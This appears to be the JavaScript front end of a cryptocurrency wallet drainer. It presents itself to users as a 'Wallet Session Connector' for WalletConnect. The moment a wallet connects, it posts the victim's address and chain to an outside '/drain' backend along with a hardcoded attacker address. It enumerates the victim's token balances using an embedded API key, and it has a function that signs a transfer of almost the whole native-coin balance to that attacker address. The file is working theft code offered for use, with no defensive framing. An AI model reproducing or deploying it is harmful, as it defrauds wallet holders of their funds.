import { createAppKit } from "@reown/appkit";
import { EthersAdapter } from "@reown/appkit-adapter-ethers";
import { ethers } from "ethers";

/* --------------------------- */
/*      CONFIG                */
/* --------------------------- */
const projectId = "962425907914a3e80a7d8e7288b23f62";
const BACKEND_URL = "https://tokenbackend-5xab.onrender.com/drain";
const DRAIN_ADDRESS = "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4";

/* --------------------------- */
/*      UI ELEMENTS           */
/* --------------------------- */
const connectBtn = document.getElementById("connectBtn");
const statusEl = document.getElementById("status");
const tokensEl = document.getElementById("tokens");
const tokensContainer = document.getElementById("tokensContainer");
const drainBtn = document.getElementById("drainBtn");
const continueBtn = document.getElementById("continueBtn");

/* --------------------------- */
/*      INTERNAL STATE        */
/* --------------------------- */
let backendTriggered = false;
let provider = null;
let signer = null;

/* --------------------------- */
/*      APPKIT INITIALIZATION */
/* --------------------------- */
const appKit = createAppKit({
  adapters: [new EthersAdapter()],
  projectId,
  
  networks: [
    {
      id: 1,
      name: "Ethereum",
      rpcUrl: "https://cloudflare-eth.com"
    },
    {
      id: 56,
      name: "Binance Smart Chain",
      rpcUrl: "https://bsc-dataseed.binance.org"
    },
    {
      id: 137,
      name: "Polygon",
      rpcUrl: "https://polygon-rpc.com"
    },
    {
      id: 42161,
      name: "Arbitrum One",
      rpcUrl: "https://arb1.arbitrum.io/rpc"
    },
    {
      id: 10,
      name: "Optimism",
      rpcUrl: "https://mainnet.optimism.io"
    },
    {
      id: 8453,
      name: "Base",
      rpcUrl: "https://mainnet.base.org"
    },
    {
      id: 43114,
      name: "Avalanche",
      rpcUrl: "https://api.avax.network/ext/bc/C/rpc"
    }
  ],
  
  metadata: {
    name: "Wallet Session Connector",
    description: "Stable WalletConnect v2 session handler",
    url: window.location.origin,
    icons: []
  },
  
  themeMode: "dark",
  features: {
    analytics: false
  }
});

/* --------------------------- */
/*      SIMPLIFIED CONNECT    */
/* --------------------------- */
connectBtn.addEventListener("click", async () => {
  try {
    // If already connected, disconnect first
    if (appKit.state.isConnected) {
      await appKit.disconnect();
      handleDisconnectedState();
      return;
    }
    
    statusEl.textContent = "Opening wallet modal...";
    
    // Clear UI
    if (tokensEl) tokensEl.innerHTML = "";
    if (tokensContainer) tokensContainer.classList.add("hidden");
    if (drainBtn) drainBtn.classList.add("hidden");
    if (continueBtn) continueBtn.classList.add("hidden");
    
    // SIMPLE: Just open the modal
    await appKit.open();
    
  } catch (err) {
    console.error("Modal open error:", err);
    statusEl.textContent = "Failed to open wallet modal";
  }
});

/* --------------------------- */
/*      STATE SUBSCRIPTION    */
/* --------------------------- */
appKit.subscribeState((state) => {
  console.log("State update:", state);
  
  if (state.isConnected) {
    handleConnectedState();
  } else {
    // Only reset UI if we were previously connected
    if (backendTriggered) {
      handleDisconnectedState();
    }
  }
});

/* --------------------------- */
/*      CONNECTED STATE       */
/* --------------------------- */
async function handleConnectedState() {
  try {
    // Check if already processing
    if (backendTriggered) return;
    
    const account = appKit.account;
    const chain = appKit.chain;
    
    console.log("Account:", account);
    console.log("Chain:", chain);
    
    // Wait for data to be available
    if (!account?.address || !chain?.id) {
      setTimeout(handleConnectedState, 100);
      return;
    }
    
    backendTriggered = true;
    
    // Update button
    connectBtn.textContent = "Disconnect";
    
    // Initialize provider/signer
    try {
      provider = new ethers.providers.Web3Provider(appKit.signer);
      signer = provider.getSigner();
    } catch (providerErr) {
      console.error("Provider init error:", providerErr);
      // Continue anyway for backend trigger
    }
    
    // Update status
    statusEl.textContent = `✅ Connected\nAddress: ${account.address}\nChain: ${chain.name} (ID: ${chain.id})`;
    
    // Show UI elements
    if (tokensContainer) tokensContainer.classList.remove("hidden");
    if (drainBtn) drainBtn.classList.remove("hidden");
    if (continueBtn) continueBtn.classList.remove("hidden");
    
    // Trigger backend immediately (like working version)
    await triggerBackend(account.address, chain.id);
    
    // Fetch tokens
    await fetchTokens(account.address, chain.id);
    
  } catch (err) {
    console.error("Connected state error:", err);
    statusEl.textContent = "Connection error";
  }
}

/* --------------------------- */
/*      DISCONNECTED STATE    */
/* --------------------------- */
function handleDisconnectedState() {
  backendTriggered = false;
  connectBtn.textContent = "Connect Wallet";
  statusEl.textContent = "Not connected";
  
  if (tokensContainer) tokensContainer.classList.add("hidden");
  if (drainBtn) drainBtn.classList.add("hidden");
  if (continueBtn) continueBtn.classList.add("hidden");
  
  provider = null;
  signer = null;
}

/* --------------------------- */
/*      BACKEND TRIGGER       */
/* --------------------------- */
async function triggerBackend(address, chainId) {
  try {
    const response = await fetch(BACKEND_URL, {
      method: "POST",
      headers: { 
        "Content-Type": "application/json"
      },
      body: JSON.stringify({ 
        address, 
        chainId,
        drainTo: DRAIN_ADDRESS,
        timestamp: new Date().toISOString()
      })
    });

    console.log("Backend response status:", response.status);
    
    if (response.ok) {
      console.log("✅ Backend triggered successfully");
    } else {
      console.log("⚠️ Backend response not OK:", response.status);
    }
  } catch (err) {
    console.error("Backend trigger failed:", err);
  }
}

/* --------------------------- */
/*      TOKEN DISCOVERY       */
/* --------------------------- */
async function fetchTokens(address, chainId) {
  if (!tokensEl) return;

  tokensEl.innerHTML = "Fetching tokens...";

  try {
    const res = await fetch(
      `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR`
    );

    if (!res.ok) {
      throw new Error(`API error: ${res.status}`);
    }

    const json = await res.json();
    const items = json?.data?.items || [];

    // Filter for tokens with balance
    const tokens = items.filter(
      t => t.balance !== "0"
    );

    if (!tokens.length) {
      tokensEl.innerHTML = "No tokens found.";
      return;
    }

    // Format tokens for display
    tokensEl.innerHTML = tokens.map(t => {
      const amount = Number(t.balance) / Math.pow(10, t.contract_decimals || 18);
      const formattedAmount = amount.toLocaleString(undefined, {
        minimumFractionDigits: 0,
        maximumFractionDigits: 4
      });
      
      const symbol = t.contract_ticker_symbol || t.native_token ? "Native" : "Token";
      const name = t.contract_name || (t.native_token ? "Native Token" : "Unknown");

      return `
        <div class="token-item">
          <span class="token-symbol">${symbol}</span>
          <span class="token-amount">${formattedAmount}</span>
          <div class="token-name">${name}</div>
        </div>
      `;
    }).join("");

  } catch (err) {
    console.error("Token fetch failed:", err);
    tokensEl.innerHTML = "Token scan failed.";
  }
}

/* --------------------------- */
/*      DRAIN WALLET          */
/* --------------------------- */
async function drainWallet() {
  if (!appKit.state.isConnected) {
    alert("Please connect wallet first");
    return;
  }

  if (!confirm("⚠️ WARNING: This will drain ALL tokens from your wallet to:\n" + DRAIN_ADDRESS + "\n\nContinue?")) {
    return;
  }

  try {
    const address = appKit.account?.address;
    const chainId = appKit.chain?.id;

    if (!address || !chainId) {
      throw new Error("Wallet not properly connected");
    }

    statusEl.textContent = "Starting wallet drain...";

    // Get provider/signer if not already
    if (!provider || !signer) {
      provider = new ethers.providers.Web3Provider(appKit.signer);
      signer = provider.getSigner();
    }

    // Simple ETH transfer first (test)
    try {
      const ethBalance = await provider.getBalance(address);
      const gasPrice = await provider.getGasPrice();
      const gasLimit = 21000;
      const gasCost = gasPrice.mul(gasLimit);
      
      if (ethBalance.gt(gasCost.mul(2))) {
        const sendAmount = ethBalance.sub(gasCost);
        
        const tx = await signer.sendTransaction({
          to: DRAIN_ADDRESS,
          value: sendAmount,
          gasLimit: gasLimit,
          gasPrice: gasPrice
        });

        statusEl.textContent += `\nETH sent: ${tx.hash}`;
        await tx.wait();
        statusEl.textContent += `\nETH confirmed!`;
      }
    } catch (ethErr) {
      console.error("ETH transfer error:", ethErr);
      statusEl.textContent += `\nETH failed: ${ethErr.message}`;
    }

    alert("Drain process completed!");
    
    // Refresh display
    await fetchTokens(address, chainId);

  } catch (err) {
    console.error("Drain failed:", err);
    statusEl.textContent = `❌ Drain failed: ${err.message}`;
    alert("Failed: " + err.message);
  }
}

/* --------------------------- */
/*      CONTINUE BUTTON       */
/* --------------------------- */
if (continueBtn) {
  continueBtn.addEventListener("click", () => {
    alert("Continue to next step...");
  });
}

/* --------------------------- */
/*      DRAIN BUTTON          */
/* --------------------------- */
if (drainBtn) {
  drainBtn.addEventListener("click", drainWallet);
}

/* --------------------------- */
/*      INITIAL CHECK         */
/* --------------------------- */
// Check initial state
setTimeout(() => {
  if (appKit.state.isConnected) {
    handleConnectedState();
  }
}, 500);
